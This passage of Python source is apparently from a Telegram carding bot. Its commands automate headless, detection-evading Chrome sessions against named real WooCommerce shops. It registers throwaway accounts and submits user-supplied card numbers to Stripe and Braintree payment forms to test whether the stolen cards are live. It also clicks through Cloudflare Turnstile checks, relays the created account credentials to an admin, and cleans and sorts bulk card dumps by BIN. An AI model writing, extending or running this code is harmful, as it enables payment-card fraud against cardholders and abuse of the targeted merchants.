    """Fill non-Stripe ZIP fields if the page has them (WooCommerce billing_postcode, etc.)."""
    driver.switch_to.default_content()
    for sel in ("billing_postcode", "address_postal_code", "postal_code", "zip"):
        try:
            el = driver.find_element(By.ID, sel)
            el.click()
            el.send_keys(Keys.CONTROL, "a")
            el.send_keys(Keys.BACKSPACE)
            el.send_keys(zip_code)
            # Trigger blur/change
            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles:true}));", el)
            driver.execute_script("arguments[0].dispatchEvent(new Event('blur', {bubbles:true}));", el)
            return
        except Exception:
            continue

# "Save my information for faster checkout" (Stripe Link) can force phone collection.
# We always opt-out by ensuring it's unchecked.
def _st_opt_out_faster_checkout(driver) -> None:
    """
    Stripe Link sometimes renders the "Save my information for faster checkout" UI as:
    - a normal <input type="checkbox"> (often hidden) + label, OR
    - a custom element with role="checkbox" and aria-checked.
    It may also be inside a Stripe/Link iframe. We search current document and all iframes.
    """

    def _try_uncheck_current_context() -> bool:
        # Return True if we found the control (checked or unchecked) in this context.
        js = r"""
(() => {
  const norm = (s) => (s || "").toLowerCase();
  const textMatch = (t) => t.includes("save my information") && (t.includes("faster checkout") || t.includes("checkout"));

  // 1) Prefer finding by visible text near the control
  const nodes = Array.from(document.querySelectorAll("label, span, div, p, button"));
  const hits = nodes.filter(n => textMatch(norm(n.innerText)));
  for (const n of hits) {
    const root = n.closest("form, section, div") || n.parentElement;
    if (!root) continue;

    const cb = root.querySelector("input[type='checkbox']");
    if (cb) {
      if (cb.checked) cb.click();
      return true;
    }

    const roleCb = root.querySelector("[role='checkbox']");
    if (roleCb) {
      const checked = norm(roleCb.getAttribute("aria-checked"));
      if (checked === "true" || checked === "mixed") roleCb.click();
      return true;
    }
  }

  // 2) Fallback: any role checkbox that looks like Link/save-info
  const roleCbs = Array.from(document.querySelectorAll("[role='checkbox']"));
  for (const el of roleCbs) {
    const al = norm(el.getAttribute("aria-label"));
    const checked = norm(el.getAttribute("aria-checked"));
    if (al.includes("save") && al.includes("information")) {
      if (checked === "true" || checked === "mixed") el.click();
      return true;
    }
  }

  // 3) Fallback: inputs with Link/save-ish attributes/labels
  const inputs = Array.from(document.querySelectorAll("input[type='checkbox']"));
  for (const cb of inputs) {
    const name = `${norm(cb.id)} ${norm(cb.name)} ${norm(cb.getAttribute("aria-label"))}`;
    const labelText = cb.labels && cb.labels.length ? norm(cb.labels[0].innerText) : "";
    if (labelText.includes("save my information") || (name.includes("save") && (name.includes("info") || name.includes("information") || name.includes("link")))) {
      if (cb.checked) cb.click();
      return true;
    }
  }

  return false;
})()
"""
        try:
            found = driver.execute_script(js)
            return bool(found)
        except Exception:
            return False

    # Try default content first
    try:
        driver.switch_to.default_content()
    except Exception:
        pass
    found_any = _try_uncheck_current_context()

    # Try every iframe (Stripe often uses multiple nested frames)
    try:
        driver.switch_to.default_content()
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
    except Exception:
        iframes = []

    for frame in iframes:
        try:
            driver.switch_to.default_content()
            driver.switch_to.frame(frame)
            if _try_uncheck_current_context():
                found_any = True
        except Exception:
            continue
        finally:
            try:
                driver.switch_to.default_content()
            except Exception:
                pass

    # Give the UI a moment to apply if we changed it
    if found_any:
        time.sleep(0.2)

# ---------- ST admin screenshot helpers ----------
def _st_md_safe(s: str) -> str:
    # This codebase uses parse_mode="Markdown" widely without escaping; keep it simple + safe-ish.
    return (s or "").replace("`", "'")

async def _st_send_admin_screenshot(
    bot: "Bot",
    driver,
    caption: str,
) -> None:
    """
    Best-effort: capture a screenshot and send it to BOT_ADMIN_ID.
    (Used for /st "response capture" screenshots.)
    """
    if not driver:
        return
    tmp_path = None
    try:
        # Unique per-process/per-call to avoid collisions across multiprocessing workers
        with tempfile.NamedTemporaryFile(prefix=f"st_{os.getpid()}_", suffix=".png", delete=False) as f:
            tmp_path = f.name
        driver.save_screenshot(tmp_path)
        with open(tmp_path, "rb") as photo:
            await bot.send_photo(
                chat_id=BOT_ADMIN_ID,
                photo=photo,
                caption=(caption or "")[:950],  # keep under Telegram caption limits
                parse_mode="Markdown",
            )
    except Exception:
        # Don't let admin reporting break the user flow
        pass
    finally:
        try:
            if tmp_path and os.path.exists(tmp_path):
                os.remove(tmp_path)
        except Exception:
            pass

# ---------- SINGLE CARD ----------
async def st_single_main(card_input, update_dict):
    uid = update_dict["user_id"]
    chat_id = update_dict["chat_id"]
    msg_id = update_dict["message_id"]
    username = update_dict.get("username", "User")
    bot = Bot(BOT_TOKEN)

    parsed = parse_card_input(card_input)
    if not parsed:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text="❌ Invalid format.\nUse: `/st 4111111111111111|08|25|123`",
            parse_mode="Markdown"
        )
        try:
            record_cmd_failure("st")
        except Exception:
            pass
        return

    card, mm, yy, cvv = parsed
    expiry = f"{mm}/{yy}"
    full_card = f"{card}|{mm}|20{yy}|{cvv}"
    start_time = time.time()
    bin_info, bin_details = get_bin_info(card[:6])
    bin_flag = (bin_details or {}).get("country_flag", "")

    try:
        ua = UserAgent().random if UserAgent else "Mozilla/5.0 Chrome/118"
        options = webdriver.ChromeOptions()
        options.binary_location = CHROME_PATH
        options.add_argument(f"user-agent={ua}")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--window-size=1920,1080")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        service = Service(executable_path=CHROME_DRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        wait = WebDriverWait(driver, 15)

        email = f"user{random.randint(10000,99999)}@example.com"
        password = f"Pass{random.randint(1000,9999)}!"

        driver.get("https://www.shoprootscience.com/my-account/add-payment-method")

        for attempt in range(1, 4):
            try:
                if attempt > 1:
                    driver.refresh()
                    time.sleep(2)
                if attempt == 1:
                    wait.until(EC.element_to_be_clickable((By.ID, "reg_email"))).send_keys(email)
                    driver.find_element(By.ID, "reg_password").send_keys(password)
                    driver.find_element(By.NAME, "register").click()
                    time.sleep(3)

                try:
                    dismiss = driver.find_element(By.CLASS_NAME, "woocommerce-store-notice__dismiss-link")
                    driver.execute_script("arguments[0].click();", dismiss)
                except:
                    pass

                _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=False)
                # Fill a random ZIP if the form asks for it (Stripe postal + any outside field)
                try:
                    _fill_zip_outside_stripe_if_present(driver, _random_us_zip())
                except Exception:
                    pass
                # Opt-out of "Save my information for faster checkout" (Link) to avoid phone requirement
                try:
                    _st_opt_out_faster_checkout(driver)
                except Exception:
                    pass
                wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()

                # wait for success or error message
                status = "Declined"
                response_text = None
                for _ in range(10):  # 5s max
                    try:
                        success = driver.find_element(By.CSS_SELECTOR, "div.woocommerce-message")
                        if "successfully added" in success.text.lower():
                            status = "Approved"
                            response_text = success.text.strip()
                            break
                    except:
                        pass
                    try:
                        error = driver.find_element(By.CSS_SELECTOR, "ul.woocommerce-error li")
                        response_text = error.text.strip()
                        break
                    except:
                        pass
                    time.sleep(0.5)

                if not response_text:
                    response_text = "Unknown"

                took = f"{time.time() - start_time:.2f}s"
                emoji = "✅" if status == "Approved" else "❌"
                result_msg = (
                    f"💳 **Card:** `{full_card}`\n"
                    f"🏦 **BIN:** `{bin_info}` {bin_flag}\n"
                    f"📟 **Status:** {emoji} **{status}**\n"
                    f"📩 **Response:** `{response_text}`\n"
                    f"🔁 **Attempt:** {attempt}/3\n"
                    f"🌐 **Gateway:** **Stripe-Auth-1**\n"
                    f"⏱ **Took:** **{took}**\n"
                    f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
                )
                await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
                try:
                    record_cmd_success("st")
                except Exception:
                    pass
                return

            except Exception as e:
                if attempt == 3:
                    await bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                        text=f"❌ Failed after 3 attempts.\nError: `{str(e)}`",
                        parse_mode="Markdown")
                    # Send screenshot + trace to admin (best-effort)
                    try:
                        admin_caption = (
                            "ST Error (after 3 attempts)\n"
                            f"💳 `{full_card}`\n"
                            f"🏦 `{bin_info}` {bin_flag}\n"
                            f"📩 `{_st_md_safe(str(e))[:320]}`\n"
                            f"🧑‍💻 {username} [`{uid}`]"
                        )
                        await _st_send_admin_screenshot(bot, driver, admin_caption)
                    except Exception:
                        pass
                    try:
                        await bot.send_message(
                            chat_id=BOT_ADMIN_ID,
                            text=f"ST Error:\n```\n{traceback.format_exc()[:3500]}\n```",
                            parse_mode="Markdown",
                        )
                    except Exception:
                        pass
                    try:
                        record_cmd_failure("st")
                    except Exception:
                        pass
                    return
    finally:
        try:
            driver.quit()
        except:
            pass

async def st_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    if not is_approved(uid, "st"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("st"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = (update.message.reply_to_message.text or "").strip()

    cards = extract_all_card_inputs(raw_input)

    if not cards:
        await update.message.reply_text("❌ No valid card found.\nUse: `/st 4111111111111111|08|25|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    if len(cards) > 1:
        await update.message.reply_text(
            "⚠️ Batch mode has been removed for `/st`.\nSend only **one** card at a time.\n\nUse: `/st 4111111111111111|08|25|123`",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id,
        )
        return

    card_input = cards[0]

    # Prefetch BIN in background (warms cache for the Selenium child process)
    try:
        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
        if b6:
            asyncio.create_task(_prefetch_bin_async(b6))
    except Exception:
        pass

    msg = await update.message.reply_text(f"💳 `{card_input}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

    update_dict = {
        "user_id": uid,
        "chat_id": update.effective_chat.id,
        "message_id": msg.message_id,
        "username": uname,
    }
    Process(target=run_st_process, args=(card_input, update_dict), daemon=True).start()

# ==== 9. /bt Command (with mail:pass send to admin) ====
def run_bt_check(card_str, chat_id, message_id):
    asyncio.run(_bt_check(card_str, chat_id, message_id))

async def _bt_check(card_str, chat_id, message_id):
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from fake_useragent import UserAgent
    import tempfile
    import shutil

    start = time.time()
    bot = Bot(BOT_TOKEN)

    def extract_card_parts(card_str):
        match = re.search(r'(\d{12,19})\D+(\d{1,2})[\/|]?(20)?(\d{2,4})\D+(\d{3,4})', card_str)
        if not match:
            return None
        return match.group(1), match.group(2).zfill(2), match.group(4)[-2:], match.group(5)

    async def fail_user():
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text="❌ Payment failed. Try again later.",
            parse_mode="Markdown"
        )

    async def fail_admin(trace, email=None, password=None):
        screenshot = "bt_fail.png"
        try:
            driver.save_screenshot(screenshot)
            caption = f"```\n{trace[:950]}\n```"
            if email and password:
                caption += f"\n\n`{email}:{password}`"
            with open(screenshot, "rb") as photo:
                await bot.send_photo(
                    chat_id=BOT_ADMIN_ID,
                    photo=photo,
                    caption=caption,
                    parse_mode="Markdown"
                )
            os.remove(screenshot)
        except Exception as ss_err:
            text = f"BT Exception (no screenshot):\n```\n{trace[:950]}\n```"
            if email and password:
                text += f"\n\n`{email}:{password}`"
            text += f"\nScreenshot error: {ss_err}"
            await bot.send_message(
                chat_id=BOT_ADMIN_ID,
                text=text,
                parse_mode="Markdown"
            )

    for attempt in range(1, 4):
        temp_profile_dir = tempfile.mkdtemp()
        driver = None
        email = password = None
        try:
            ua = UserAgent()
            options = webdriver.ChromeOptions()
            options.binary_location = CHROME_PATH
            options.add_argument(f"--user-data-dir={temp_profile_dir}")
            options.add_argument(f"user-agent={ua.random}")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_argument("--headless=new")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--window-size=1920,1080")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            options.add_experimental_option('useAutomationExtension', False)
            options.add_experimental_option("prefs", {
                "profile.managed_default_content_settings.images": 2,
                "profile.managed_default_content_settings.stylesheets": 2
            })

            driver = webdriver.Chrome(service=Service(CHROME_DRIVER_PATH), options=options)
            wait = WebDriverWait(driver, 20)

            # 1. Go to billing address form
            driver.get("https://truedark.com/my-account/edit-address/billing/")
            time.sleep(1)

            # --- Cookie & Popup Handling ---
            try:
                accept_btn = driver.find_element(By.CSS_SELECTOR, "button.cmplz-btn.cmplz-accept")
                if accept_btn.is_displayed():
                    driver.execute_script("arguments[0].click();", accept_btn)
                    WebDriverWait(driver, 5).until_not(
                        EC.visibility_of_element_located((By.CSS_SELECTOR, ".cmplz-cookiebanner"))
                    )
                    time.sleep(0.3)
            except Exception:
                pass

            # Cloudflare Turnstile (if present)
            try:
                iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='turnstile']")
                driver.switch_to.frame(iframe)
                wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='checkbox']"))).click()
                driver.switch_to.default_content()
                time.sleep(1)
            except:
                pass

            # Klaviyo popup close (if present)
            try:
                popup = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@class, 'klaviyo-close-form')]")))
                popup.click()
            except:
                pass

            email = random_email()
            password = random_password()

            wait.until(EC.presence_of_element_located((By.ID, "reg_email"))).send_keys(email)
            wait.until(EC.presence_of_element_located((By.ID, "reg_password"))).send_keys(password)
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@class,'woocommerce-form-register__submit')]"))).click()

            # Billing details
            wait.until(EC.element_to_be_clickable((By.ID, "select2-billing_country-container"))).click()
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "select2-search__field"))).send_keys("United States" + u'\ue007')
            driver.find_element(By.ID, "select2-billing_state-container").click()
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, "select2-search__field"))).send_keys("Alabama" + u'\ue007')

            driver.find_element(By.ID, "billing_first_name").send_keys("Lucas")
            driver.find_element(By.ID, "billing_last_name").send_keys("Miller")
            driver.find_element(By.ID, "billing_address_1").send_keys("123 Main St")
            driver.find_element(By.ID, "billing_city").send_keys("Austin")
            driver.find_element(By.ID, "billing_postcode").send_keys("98101")
            driver.find_element(By.ID, "billing_phone").send_keys("20255501" + ''.join(random.choices(string.digits, k=2)))

            # Hide cookie banner again (for double-safety)
            try:
                cookie_banner = driver.find_element(By.CLASS_NAME, "cmplz-cookiebanner")
                if cookie_banner.is_displayed():
                    driver.execute_script("arguments[0].style.display='none';", cookie_banner)
                    time.sleep(0.3)
            except:
                pass

            # Scroll to and click save address
            save_btn = wait.until(EC.element_to_be_clickable((By.NAME, "save_address")))
            driver.execute_script("arguments[0].scrollIntoView(true);", save_btn)
            time.sleep(0.1)
            save_btn.click()
            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            # 2. Go to add-payment-method
            driver.get("https://truedark.com/my-account/add-payment-method/")
            time.sleep(1.5)

            parts = extract_card_parts(card_str)
            if not parts:
                raise Exception("Invalid card format.")
            card, mm, yy, cvv = parts
            exp = f"{mm} / {yy}"
            bin_info, bin_details = get_bin_info(card[:6])
            bin_flag = (bin_details or {}).get("country_flag", "")

            # Braintree iframe: card
            wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-number']")))
            iframe_number = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-number']")
            driver.switch_to.frame(iframe_number)
            wait.until(EC.presence_of_element_located((By.ID, "credit-card-number"))).send_keys(card)
            driver.switch_to.default_content()

            # Braintree iframe: expiry
            iframe_exp = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-expirationDate']")
            driver.switch_to.frame(iframe_exp)
            wait.until(EC.presence_of_element_located((By.ID, "expiration"))).send_keys(exp)
            driver.switch_to.default_content()

            # Braintree iframe: cvv
            iframe_cvv = driver.find_element(By.CSS_SELECTOR, "iframe[name*='braintree-hosted-field-cvv']")
            driver.switch_to.frame(iframe_cvv)
            wait.until(EC.presence_of_element_located((By.ID, "cvv"))).send_keys(cvv)
            driver.switch_to.default_content()

            place_btn = wait.until(EC.element_to_be_clickable((By.ID, "place_order")))
            driver.execute_script("arguments[0].scrollIntoView(true);", place_btn)
            try:
                place_btn.click()
            except:
                driver.execute_script("arguments[0].click();", place_btn)

            # Wait for result
            result_el = wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR,
                "div.woocommerce-error, div.woocommerce-message, div.message-container.alert-color, div.message-container.success-color")))
            result_text = result_el.text.strip()
            status = "✅ Approved" if "new payment method added" in result_text.lower() else "❌ Declined"
            full_card = f"{card}|{mm}|20{yy}|{cvv}"
            took = round(time.time() - start, 2)

            msg = (
                f"💳 Card: `{full_card}`\n"
                f"🏦 BIN: `{bin_info}` {bin_flag}\n"
                f"📟 Status: {status}\n"
                f"📩 Response: `{result_text}`\n"
                f"🔁 Attempt: {attempt}/3\n"
                f"🌐 Gateway: Braintree Auth-1\n"
                f"⏱ Took: {took}s"
            )
            await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")
            try:
                record_cmd_success("bt")
            except Exception:
                pass

            # Send BT account used to admin
            try:
                await bot.send_message(
                    chat_id=BOT_ADMIN_ID,
                    text=f"BT Account Used:\n`{email}:{password}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

            # Auto-delete approved card
            if "new payment method added" in result_text.lower():
                try:
                    delete_btn = driver.find_element(By.CSS_SELECTOR, "a.button.delete[href*='delete-payment-method']")
                    delete_btn.click()
                    time.sleep(1)
                    try:
                        WebDriverWait(driver, 3).until(EC.alert_is_present())
                        driver.switch_to.alert.accept()
                    except:
                        pass
                    msg += "\n\n🗑️ Card was auto-deleted after approval."
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")
                except Exception as e:
                    msg += f"\n\n⚠️ Card approved, but delete failed: {e}"
                    await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=msg, parse_mode="Markdown")

            driver.quit()
            shutil.rmtree(temp_profile_dir, ignore_errors=True)
            return

        except Exception:
            if attempt == 3:
                trace = traceback.format_exc()
                await fail_user()
                await fail_admin(trace, email, password)  # Also sends email:pass on fail
                try:
                    record_cmd_failure("bt")
                except Exception:
                    pass
            try:
                if driver:
                    driver.quit()
                shutil.rmtree(temp_profile_dir, ignore_errors=True)
            except:
                pass

async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_approved(uid, "bt"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("bt"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()

    lines = raw_input.split("\n") if "\n" in raw_input else [raw_input]
    cards = [line.strip() for line in lines if re.search(r'\d{12,19}.*\d{1,2}.*\d{2,4}.*\d{3,4}', line)]

    if not cards:
        await update.message.reply_text("❌ No valid card(s) found.\nUse: `/bt 4111111111111111|08|2026|123`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return

    if len(cards) > 6:
        await update.message.reply_text("⚠️ You can send a maximum of 6 cards at once.", reply_to_message_id=update.message.message_id)
        return

    for card_str in cards:
        # Prefetch BIN in background (warms cache for the Selenium child process)
        try:
            b6 = re.sub(r"[^0-9]", "", card_str)[:6]
            if b6:
                asyncio.create_task(_prefetch_bin_async(b6))
        except Exception:
            pass

        msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()

# ==== 10. /chk Command (FINAL - FILE + SS FIXED) ==== #

def get_chk_accounts():
    accounts = []
    try:
        with open("chk_accounts.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    email, password = line.split(":", 1)
                elif "|" in line:
                    email, password = line.split("|", 1)
                else:
                    continue
                accounts.append((email.strip(), password.strip()))
    except Exception as e:
        print("Failed to read chk_accounts.txt:", e)
    return accounts


def run_chk_process(card_input):
    import random, time, traceback
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC

    start = time.time()
    driver = None

    try:
        accounts = get_chk_accounts()
        if not accounts:
            return {"error": "No accounts found", "driver": None}

        email, password = random.choice(accounts)

        driver = create_killer_driver()
        wait = WebDriverWait(driver, 8)

        url = "https://shop.pottyplant.com.au/my-account/add-payment-method/"
        driver.get(url)

        # ===== LOGIN =====
        wait.until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
        wait.until(EC.presence_of_element_located((By.ID, "password"))).send_keys(password)

        driver.execute_script(
            "arguments[0].click();",
            wait.until(EC.presence_of_element_located((By.NAME, "login")))
        )

        time.sleep(2)

        # 🔥 FORCE REDIRECT AFTER LOGIN
        driver.get(url)
        wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        # ===== WAIT FOR SUBMIT BUTTON =====
        add_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))

        cc, mm, yy, cvv = killer_split_card(card_input)

        # ===== BRAINTREE FILL =====
        iframes = driver.find_elements(By.CSS_SELECTOR, "iframe")

        for iframe in iframes:
            try:
                driver.switch_to.frame(iframe)
                src = iframe.get_attribute("src") or ""

                if "number" in src:
                    driver.find_element(By.NAME, "credit-card-number").send_keys(cc)

                elif "expiration" in src:
                    driver.find_element(By.NAME, "expiration").send_keys(mm + yy)

                elif "cvv" in src:
                    driver.find_element(By.NAME, "cvv").send_keys(cvv)

                driver.switch_to.default_content()
            except:
                driver.switch_to.default_content()

        # ===== SUBMIT =====
        driver.execute_script("arguments[0].click();", add_btn)

        time.sleep(2)

        # ===== RESPONSE =====
        try:
            err = driver.find_element(By.CSS_SELECTOR, ".woocommerce-error li").text
            status = "DECLINED"
            response = err
        except:
            status = "APPROVED"
            response = "No error returned"

        duration = round(time.time() - start, 2)
        bin_info, bin_flag = get_cached_bin_info(cc[:6])

        # ✅ CLOSE DRIVER ONLY ON SUCCESS
        try:
            driver.quit()
        except:
            pass

        return {
            "status": status,
            "response": response,
            "time": duration,
            "bin": f"{bin_info} {bin_flag}",
            "account": email
        }

    except Exception:
        # ❗ DO NOT CLOSE DRIVER HERE
        return {
            "error": traceback.format_exc(),
            "driver": driver
        }


# ================= TELEGRAM CMD =================

async def chk_cmd(update, context):
    uid = update.effective_user.id

    if not is_approved(uid, "chk"):
        await update.message.reply_text("⛔ You are not approved to use this command.")
        return

    if not is_cmd_enabled("chk"):
        await update.message.reply_text("⚠️ This command is currently disabled.")
        return

    raw_input = " ".join(context.args).strip() if context.args else ""
    if not raw_input and update.message.reply_to_message:
        raw_input = update.message.reply_to_message.text.strip()

    card_input = extract_card_input(raw_input)
    if not card_input:
        await update.message.reply_text(
            "❌ Invalid card.\nUse: `/chk 4111111111111111|12|25|123`",
            parse_mode="Markdown"
        )
        return

    # BIN prefetch
    try:
        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
        if b6:
            asyncio.create_task(_prefetch_bin_async(b6))
    except:
        pass

    msg = await update.message.reply_text("⚙️ Processing Braintree Auth...")

    try:
        result = await asyncio.to_thread(run_chk_process, card_input)

        if "error" in result:
            raise Exception(result)

        await msg.edit_text(
            f"💳 `{card_input}`\n\n"
            f"📊 **Status:** {result['status']}\n"
            f"💬 **Response:** {result['response']}\n"
            f"🏦 **BIN:** {result['bin']}\n"
            f"👤 **Used:** `{result['account']}`\n"
            f"🌐 **Gateway:** chk v2\n"
            f"⏱ **Time:** {result['time']}s",
            parse_mode="Markdown"
        )

        record_cmd_success("chk")

    except Exception as e:
        err_data = e.args[0] if isinstance(e.args[0], dict) else {}
        trace = err_data.get("error", str(e))
        driver = err_data.get("driver", None)

        await msg.edit_text("❌ Request timeout, try again.")

        # 📸 SEND SCREENSHOT TO ADMIN
        try:
            killer_admin_report("chk", trace, driver)
        except:
            pass

        # 🔥 NOW CLOSE DRIVER AFTER SS
        try:
            if driver:
                driver.quit()
        except:
            pass

        record_cmd_failure("chk")

# ==== 12. /sort COMMAND (Fixed Card Sorting & Cleaning) ====
def extract_and_clean_cards_sort(data_text):
    """
    Extract and clean cards for /sort command - OPTIMIZED for 200MB+ files.
    Returns tuple: (valid_cards, duplicates_count, expired_count, junk_count, total_raw)
    """
    if not data_text or not isinstance(data_text, str):
        return [], 0, 0, 0, 0
    
    valid_cards = []
    seen = set()
    stats = {'dup': 0, 'exp': 0, 'junk': 0, 'raw': 0}
    
    # Single comprehensive pattern
    pattern = re.compile(r'(\d{13,19})[|\s/\\:;,._-]+(\d{1,2})[|\s/\\:;,._-]+(\d{2,4})[|\s/\\:;,._-]+(\d{3,4})')
    
    # Current time for expiry check
    now_year = datetime.now().year
    now_month = datetime.now().month
    
    # Process in chunks for memory efficiency
    chunk_size = 1024 * 1024  # 1MB
    pos = 0
    text_len = len(data_text)
    
    while pos < text_len:
        end = min(pos + chunk_size, text_len)
        if end < text_len:
            newline_pos = data_text.find('\n', end)
            if newline_pos != -1 and newline_pos < end + 500:
                end = newline_pos + 1
        
        chunk = data_text[pos:end]
        pos = end
        
        for match in pattern.finditer(chunk):
            stats['raw'] += 1
            cc, mm, yy, cvv = match.groups()
            
            # Normalize
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[-2:]
            else:
                yy = yy.zfill(2)
            
            # Quick validations
            try:
                if not (1 <= int(mm) <= 12):
                    stats['junk'] += 1
                    continue
            except:
                stats['junk'] += 1
                continue
            
            if len(cvv) < 3:
                stats['junk'] += 1
                continue
            
            # Inline Luhn check
            try:
                total = 0
                for i, c in enumerate(reversed(cc)):
                    d = int(c)
                    if i % 2 == 1:
                        d *= 2
                        if d > 9:
                            d -= 9
                    total += d
                if total % 10 != 0:
                    stats['junk'] += 1
                    continue
            except:
                stats['junk'] += 1
                continue
            
            # Expiry check
            try:
                year = 2000 + int(yy)
                month = int(mm)
                if year < now_year or (year == now_year and month < now_month):
                    stats['exp'] += 1
                    continue
            except:
                stats['junk'] += 1
                continue
            
            # Format and dedupe
            formatted = f"{cc}|{mm}|{yy}|{cvv}"
            if formatted in seen:
                stats['dup'] += 1
                continue
            seen.add(formatted)
            valid_cards.append(formatted)
    
    # Sort by BIN
    valid_cards.sort(key=lambda x: x[:6])
    
    return valid_cards, stats['dup'], stats['exp'], stats['junk'], stats['raw']

async def sort_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    username = update.effective_user.username or uname
    
    if not is_approved(uid, "sort"):
        await update.message.reply_text("⛔ You are not approved to use this command.", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("sort"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    data_text = ""
    file_size_mb = 0
    processing_msg = None
    
    # Check if message is a reply
    if update.message.reply_to_message:
        replied_msg = update.message.reply_to_message
        
        # Check for document attachment
        if replied_msg.document:
            file_size = replied_msg.document.file_size
            file_size_mb = file_size / (1024 * 1024)
            
            processing_msg = await update.message.reply_text(
                f"📥 Downloading file ({file_size_mb:.1f}MB)...", 
                reply_to_message_id=update.message.message_id
            )
            try:
                # For files > 20MB, use Pyrogram to download
                if file_size > 20 * 1024 * 1024:
                    if _pyrogram_available and _get_pyrogram_config():
                        await processing_msg.edit_text(
                            f"📥 Downloading large file ({file_size_mb:.1f}MB) via MTProto...\n\n"
                            f"<i>This may take a moment...</i>",
                            parse_mode="HTML"
                        )
                        file_bytes = await download_large_file_pyrogram(
                            replied_msg.document.file_id,
                            file_size
                        )
                        if file_bytes:
                            # Decode the file
                            for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
                                try:
                                    data_text = file_bytes.decode(encoding)
                                    break
                                except UnicodeDecodeError:
                                    continue
                            else:
                                data_text = file_bytes.decode('utf-8', errors='ignore')
                            
                            if not data_text or not data_text.strip():
                                await processing_msg.edit_text("❌ File is empty or could not be read.")
                                return
                            await processing_msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB...")
                        else:
                            await processing_msg.edit_text(
                                f"❌ Failed to download large file.\n\n"
                                "🌐 *Alternative - use URL:*\n"
                                "1. Upload to: transfer.sh, file.io, catbox.moe\n"
                                "2. Use: `/sort <URL>`",
                                parse_mode="Markdown"
                            )
                            return
                    else:
                        await processing_msg.edit_text(
                            f"⚠️ File too large: {file_size_mb:.1f}MB\n\n"
                            "💡 *Large file support requires API_ID & API_HASH*\n\n"
                            "🌐 *Or use URL method:*\n"
                            "1. Upload to: transfer.sh, file.io, catbox.moe\n"
                            "2. Use: `/sort <URL>`",
                            parse_mode="Markdown"
                        )
                        return
                else:
                    # Standard download for files under 20MB
                    file = await context.bot.get_file(replied_msg.document.file_id)
                    data_text = await download_file_content(file)
                
                if not data_text or not data_text.strip():
